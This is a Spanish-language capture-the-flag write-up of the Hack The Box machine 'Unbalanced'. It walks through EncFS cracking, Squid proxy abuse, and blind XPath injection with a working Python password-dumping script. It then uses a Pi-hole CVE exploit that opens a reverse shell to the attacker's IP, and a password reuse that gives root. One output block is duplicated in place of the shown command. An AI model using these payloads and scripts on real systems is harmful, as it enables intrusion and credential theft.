---
layout: post
title: Unbalanced
date: 2023-03-09
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE, eCPPTv2]
---
___

<center><img src="/writeups/assets/img/Unbalanced-htb/Unbalanced.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración de Rsync

* Decrypt de Encrypted File System

* Enumeración de Squid Proxy

* XPath Inyection

* Python Scripting

* Local Port Forwarding

* Abuso de Pi-hole

* Information Disclosure

* Reutilización de contraseña (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.200 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 11:52 GMT
Nmap scan report for 10.10.10.200
Host is up (0.061s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
873/tcp  open  rsync
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,873,3128 10.10.10.200 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 12:01 GMT
Nmap scan report for 10.10.10.200
Host is up (0.064s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2765cb0886f9e62e88351e7cfbf2df2 (RSA)
|   256 d065fbf63e11b1d6e6f75ec0150c0a77 (ECDSA)
|_  256 5e2b93591d49288d432cc1f7e3370f83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds
```

## Puerto 873 (RSYNC)

Puedo listar recursos

```null
rsync rsync://10.10.10.200:873
conf_backups   	EncFS-encrypted configuration backups
```

En los backups hay un ```null```

```null
rsync rsync://10.10.10.200:873/conf_backups/
drwxr-xr-x          4,096 2020/04/04 15:05:32 .
-rw-r--r--            288 2020/04/04 15:05:31 ,CBjPJW4EGlcqwZW4nmVqBA6
-rw-r--r--            135 2020/04/04 15:05:31 -FjZ6-6,Fa,tMvlDsuVAO7ek
-rw-r--r--          1,297 2020/04/02 13:06:19 .encfs6.xml
-rw-r--r--            154 2020/04/04 15:05:32 0K72OfkNRRx3-f0Y6eQKwnjn
```

Me lo traigo a mi equipo para ver su contenido

```null
rsync -av rsync://10.10.10.200:873/conf_backups/ .
```

```null
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE boost_serialization>
 <boost_serialization signature="serialization::archive" version="7">
     <cfg class_id="0" tracking_level="0" version="20">
         <version>20100713</version>
         <creator>EncFS 1.9.5</creator>
         <cipherAlg class_id="1" tracking_level="0" version="0">
             <name>ssl/aes</name>
             <major>3</major>
             <minor>0</minor>
         </cipherAlg>
         <nameAlg>
             <name>nameio/block</name>
             <major>4</major>
             <minor>0</minor>
         </nameAlg>
         <keySize>192</keySize>
         <blockSize>1024</blockSize>
         <plainData>0</plainData>
         <uniqueIV>1</uniqueIV>
         <chainedNameIV>1</chainedNameIV>
         <externalIVChaining>0</externalIVChaining>
         <blockMACBytes>0</blockMACBytes>
         <blockMACRandBytes>0</blockMACRandBytes>
         <allowHoles>1</allowHoles>
         <encodedKeySize>44</encodedKeySize>
         <encodedKeyData>
 GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=
 </encodedKeyData>
         <saltLen>20</saltLen>
         <saltData>
 mRdqbk2WwLMrrZ1P6z2OQlFl8QU=
 </saltData>
         <kdfIterations>580280</kdfIterations>
         <desiredKDFDuration>500</desiredKDFDuration>
     </cfg>
 </boost_serialization>
```

El resto de los datos no son legibles, ya que están cifrados por ```encfs```. Necesito una contraseña

```null
encfs /home/rubbx/Desktop/HTB/Machines/Unbalanced/rsn /home/rubbx/Desktop/HTB/Machines/Unbalanced/decrypt
EncFS Password:
```

Creo un hash equivalente para crackearlo por fuerza bruta

```null
encfs2john rsn/ > hash
```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 580280 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bubblegum        (rsn/)     
1g 0:00:00:10 DONE (2023-03-09 13:06) 0.09794g/s 72.08p/s 72.08c/s 72.08C/s bambam..raquel
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Aplico el decrypt y puedo ver el contenido

```null
ls
50-localauthority.conf		   dconf		   fakeroot-x86_64-linux-gnu.conf  kernel-img.conf   mke2fs.conf		      parser.conf	  squid.conf		 Vendor.conf
50-nullbackend.conf		   debconf.conf	   framework.conf		   ldap.conf	     modules.conf		      protect-links.conf  sysctl.conf		 wpa_supplicant.conf
51-debian-sudo.conf		   debian.conf		   fuse.conf			   ld.so.conf	     namespace.conf		      reportbug.conf	  system.conf		 x86_64-linux-gnu.conf
70debconf			   deluser.conf	   gai.conf			   libaudit.conf     network.conf		      resolv.conf	  time.conf		 xattr.conf
99-sysctl.conf			   dhclient.conf	   group.conf			   libc.conf	     networkd.conf		      resolved.conf	  timesyncd.conf
access.conf			   discover-modprobe.conf  hdparm.conf			   limits.conf       nsswitch.conf		      rsyncd.conf	  ucf.conf
adduser.conf			   dkms.conf		   host.conf			   listchanges.conf  org.freedesktop.PackageKit.conf  rsyslog.conf	  udev.conf
bluetooth.conf			   dns.conf		   initramfs.conf		   logind.conf       PackageKit.conf		      semanage.conf	  update-initramfs.conf
ca-certificates.conf		   dnsmasq.conf	   input.conf			   logrotate.conf    pam.conf			      sepermit.conf	  user.conf
com.ubuntu.SoftwareProperties.conf  docker.conf		   journald.conf		   main.conf	     pam_env.conf		      sleep.conf	  user-dirs.conf
```

Crea una montura temporal

```null
df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            4.5G     0  4.5G   0% /dev
tmpfs           911M  1.2M  909M   1% /run
/dev/sda2       238G   35G  191G  16% /
tmpfs           4.5G     0  4.5G   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           911M   92K  910M   1% /run/user/1000
encfs           238G   35G  191G  16% /home/rubbx/Desktop/HTB/Machines/Unbalanced/decrypt
```

De todo filtro por usuarios y contraseñas

```null
cat * | grep -v "^#" | sed '/^\s*$/d' | grep -E "username|password"
Reject-Type: password
Name: passwords
Accept-Type: password
Filename: /var/cache/debconf/passwords.dat
Stack: config, passwords
```

Pero no aparece ninguna en texto claro. Un archivo corresponde a la configuración del SQUID-PROXY, que está desplegado en el puerto 3128

```null
cat squid.conf | grep -v "^#" | sed '/^\s*$/d'
acl localnet src 0.0.0.1-0.255.255.255      # RFC 1122 "this" network (LAN)
acl localnet src 10.0.0.0/8             # RFC 1918 local private network (LAN)
acl localnet src 100.64.0.0/10          # RFC 6598 shared address space (CGN)
acl localnet src 169.254.0.0/16         # RFC 3927 link-local (directly plugged) machines
acl localnet src 172.16.0.0/12          # RFC 1918 local private network (LAN)
acl localnet src 192.168.0.0/16         # RFC 1918 local private network (LAN)
acl localnet src fc00::/7               # RFC 4193 local private network range
acl localnet src fe80::/10              # RFC 4291 link-local (directly plugged) machines
acl SSL_ports port 443
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow manager
include /etc/squid/conf.d/*
http_access allow localhost
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
cache disable
```

Añado el dominio ```intraned.unbalanced.htb``` al ```/etc/hosts```. Se puede ver una contraseña, ```Thah$Sh1```

Aplico otra búsqueda y encuentro credenciales

```null
cat * | grep -v "^#" | grep user
AdminIdentities=unix-user:0
  <policy user="root">
  <!-- allow users of bluetooth group to communicate -->
  <!-- allow users of lp group (printing subsystem) to 
  <policy user="root">
  owner /{,var/}run/user/*/dconf/user r,
  owner @{HOME}/.config/dconf/user r,
        <policy user="root">
        <policy user="dnsmasq">
        default_mntopts = acl,user_xattr
  <!-- Only user root can own the PackageKit service -->
  <policy user="root">
user.*                          -/var/log/user.log
        <policy user="root">
user.Beagle.*                   skip            # ignore Beagle index data
```

Puedo ver puertos abiertos internamente. Para pasar por el proxy, agrego una configuración en el ```BurpSuite```

<img src="/writeups/assets/img/Unbalanced-htb/2.png" alt="">

## Puerto 3128 (HTTP-PROXY)

La página principal se ve así:

<img src="/writeups/assets/img/Unbalanced-htb/1.png" alt="">

Todos los Squid Proxy tienen una ruta de administración, ```squid-internal-mgr```

```null
curl -s -X GET 'http://10.10.10.200:3128/squid-internal-mgr/menu' | html2text

****** ERROR ******
***** Cache Manager Access Denied. *****
===============================================================================
The following error was encountered while trying to retrieve the URL: http://
unbalanced:3128/squid-internal-mgr/menu
     Cache Manager Access Denied.
Sorry, you are not currently allowed to request http://unbalanced:3128/squid-
internal-mgr/menu from this cache manager until you have authenticated
yourself.
Please contact the cache_administrator if you have difficulties authenticating
yourself or, if you are the administrator, read Squid documentation on cache
manager interface and check cache log for more detailed error messages.

===============================================================================
Generated Thu, 09 Mar 2023 13:39:45 GMT by unbalanced (squid/4.6)
```

Pruebo las credenciales que ya tengo

```null
curl -s -X GET 'http://:Thah$Sh1@10.10.10.200:3128/squid-internal-mgr/menu' | grep -v "disabled"
 menu                     Cache Manager Menu                      protected
 pconn                  Persistent Connection Utilization Histograms    protected
 mem                    Memory Utilization                      protected
 diskd                  DISKD Stats                             protected
 fqdncache              FQDN Cache Stats and Contents           protected
 filedescriptors        Process Filedescriptor Allocation       protected
 objects                All Cache Objects                       protected
 vm_objects             In-Memory and In-Transit Objects        protected
 counters               Traffic and Resource Counters           protected
 5min                   5 Minute Average of Counters            protected
 60min                  60 Minute Average of Counters           protected
 histograms             Full Histogram Counts                   protected
 cbdata                 Callback Data Registry Contents         protected
 sbuf                   String-Buffer statistics                protected
 events                 Event Queue                             protected
```

El subdominio sí que carga

<img src="/writeups/assets/img/Unbalanced-htb/3.png" alt="">

La parte de registro no es vulnerable a ningún tipo de inyección. Sin embargo, en las cabeceras de respuesta se puede ver que se están empleando balanceadores de carga

<img src="/writeups/assets/img/Unbalanced-htb/4.png" alt="">

Puedo tratar de abusar del FQDN para obtener más información del equipo, a través del menú de Administración´

```null
curl -s -X GET 'http://:Thah$Sh1@10.10.10.200:3128/squid-internal-mgr/fqdncache'
FQDN Cache Statistics:
FQDNcache Entries In Use: 10
FQDNcache Entries Cached: 8
FQDNcache Requests: 427
FQDNcache Hits: 0
FQDNcache Negative Hits: 117
FQDNcache Misses: 310
FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
```

Apuntan a distintas IP. No es necesario agregarlas al ```/etc/hosts```, ya que estoy pasando por un proxy. De hecho, entraría en conflicto. Podría intentar conectarme a otra IP aunque no aparezca en esta lista

<img src="/writeups/assets/img/Unbalanced-htb/5.png" alt="">

A pesar de ello, la ruta ```/intranet.php``` existe. En este caso, al tratar de iniciar sesión se ve reflejado un error en la respuesta

<img src="/writeups/assets/img/Unbalanced-htb/6.png" alt="">

Si introduzco una comilla, desaparece. Pero no se trata de una inyección SQL. En caso de utilizar SQLMap no va a detectar nada. Se trata de una XPath Inyection

```null
Username=admin&Password=' or 1=1 or ''='
```

Obtengo todos los usuarios

```null
curl -s -X POST http://172.31.179.1/intranet.php -d "Username=admin&Password=' or 1=1 or ''='" --proxy http://10.10.10.200:3128 | grep -oP '<p>.*?</p>' | grep htb | tr -d ' ' | sed 's/<p>//' | sed 's/<\/p>//'
rita@unbalanced.htb
jim@unbalanced.htb
bryan@unbalanced.htb
sarah@unbalanced.htb
```

[PayloadAllThethings](https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/#summary) tiene una guía de las ```XPath Inyection```. Utilizo el ```Intruder``` de ```BurpSuite``` para bruteforcear la longitud de la contraseña para un usuario dado

<img src="/writeups/assets/img/Unbalanced-htb/7.png" alt="">

El total es 11. Como ha funcionado, creo un script en python que se encargue de dumpear las contraseñas para cada usuario. Lo primero es saber la longitud

```null
#!/usr/bin/python3

import sys, signal, requests, time, string, pdb

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://172.31.179.1/intranet.php"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
users = ["rita", "jim", "bryan", "sarah"]
burp = {'http': 'http://127.0.0.1:8080'}


def getpasslen(user):

    for length in range(1, 40):
        post_data = {
        'Username':'admin',
        "Password": "admin' or Username='%s' and string-length(Password)='%d" % (user, length)
        }

        r = requests.post(login_url, data=post_data, proxies=burp)

        if "Invalid credentials." not in r.text:
            return length


def getpass(user, length):

    password = ""

    for position in range(1, length+1):

        for character in characters:
            post_data = {
            'Username':'admin',
            "Password": "admin' or Username='%s' and substring(Password,%d,1)='%s" % (user, position, character)
            }

            r = requests.post(login_url, data=post_data, proxies=burp)

            if "Invalid credentials." not in r.text:
                password += character
                break
    return password


if __name__ == '__main__':

    for user in users:
        length = getpasslen(user)
        print("[+] User %s: %d characters" % (user, length))

        password = getpass(user, length)
        print("\t[+] Password %s" % password)
```

```null
python3 xpathi.py
[+] User rita: 11 characters
        [+] Password password01!
[+] User jim: 16 characters
        [+] Password stairwaytoheaven
[+] User bryan: 23 characters
        [+] Password ireallyl0vebubblegum!!!
[+] User sarah: 10 characters
        [+] Password sarah4evah
```

Una es válida por SSH

```null
crackmapexec ssh 10.10.10.200 -u users -p passwords | grep "+"
SSH         10.10.10.200    22     10.10.10.200     [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         10.10.10.200    22     10.10.10.200     [+] bryan:ireallyl0vebubblegum!!! 
```

```null
ssh bryan@10.10.10.200
The authenticity of host '10.10.10.200 (10.10.10.200)' can't be established.
ED25519 key fingerprint is SHA256:5T7VuIDF8HLe+9mylE15ZnHdZBlNTB/FeEORjKmivf0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.200' (ED25519) to the list of known hosts.
bryan@10.10.10.200's password: 
Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 17 14:16:06 2020 from 10.10.10.4
bryan@unbalanced:~$ 
```

Puedo ver la primera flag

```null
bryan@unbalanced:~$ cat user.txt 
703589884e93d69c30213989bb322a67
```

# Escalada

En su directorio personal hay un archivo TODO

```null
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]
```

Miro los puertos que están abiertos internamente

```null
bryan@unbalanced:/$ ss -nltp
State                       Recv-Q                      Send-Q                                             Local Address:Port                                             Peer Address:Port                      
LISTEN                      0                           128                                                    127.0.0.1:8080                                                  0.0.0.0:*                         
LISTEN                      0                           128                                                    127.0.0.1:5553                                                  0.0.0.0:*                         
LISTEN                      0                           32                                                       0.0.0.0:53                                                    0.0.0.0:*                         
LISTEN                      0                           128                                                      0.0.0.0:22                                                    0.0.0.0:*                         
LISTEN                      0                           5                                                        0.0.0.0:873                                                   0.0.0.0:*                         
LISTEN                      0                           32                                                          [::]:53                                                       [::]:*                         
LISTEN                      0                           128                                                         [::]:22                                                       [::]:*                         
LISTEN                      0                           128                                                            *:3128                                                        *:*                         
LISTEN                      0                           5                                                           [::]:873                                                      [::]:*                         
```

Me traigo el puerto 8080 con Local Port Forwading

```null
ssh bryan@10.10.10.200 -L 8080:127.0.0.1:8080
```

Busco por exploits públicos hacia este servicio y examino uno que contempla una escalada de privilegios

```null
searchsploit -x python/webapps/48727.py
```

En las cabeceras que emite se puede ver una ruta

```null
headers = {"Origin":url,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Connection":"close","Referer":url + "/admin/index.php?login","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
```

Existe en este caso

<img src="/writeups/assets/img/Unbalanced-htb/8.png" alt="">

Pruebo credenciales por defecto, ```admin:admin```. Busco por el CVE y me descargo otro exploit de [Github](https://raw.githubusercontent.com/AndreyRainchik/CVE-2020-8816/master/CVE-2020-8816.py), que esté más funcional. Ejecuto y recibo una reverse shell

```null
 python3 CVE-2020-8816.py http://127.0.0.1:8080 admin 10.10.16.9 443
Attempting to verify if Pi-hole version is vulnerable
Logging in...
Login succeeded
Grabbing CSRF token
Attempting to read $PATH
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.200] 59104
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@pihole:/var/www/html/admin$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@pihole:/var/www/html/admin$ export TERM=xterm
www-data@pihole:/var/www/html/admin$ export SHELL=bash
www-data@pihole:/var/www/html/admin$ stty rows 55 columns 209
```

Estoy dentro de un contenedor

```null
www-data@pihole:/var/www/html/admin$ whoami
www-data
www-data@pihole:/var/www/html/admin$ hostname -I
172.31.11.3 
```

Tengo acceso al directorio ```/root```

```null
www-data@pihole:/root$ ls
ph_install.sh  pihole_config.sh
```

Un archivo tiene una contraseña en texto claro

```null
www-data@pihole:/root$ cat pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```

Se reutiliza para el usuario ```root``` en la máquina host

```null
www-data@pihole:/root$ cat pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```

Puedo ver la segunda flag

```null
bryan@unbalanced:/$ su root
Password: 
root@unbalanced:/# cat /root/root.txt 
59a2f0b95b8482a61a8aa6659f7d19d5
```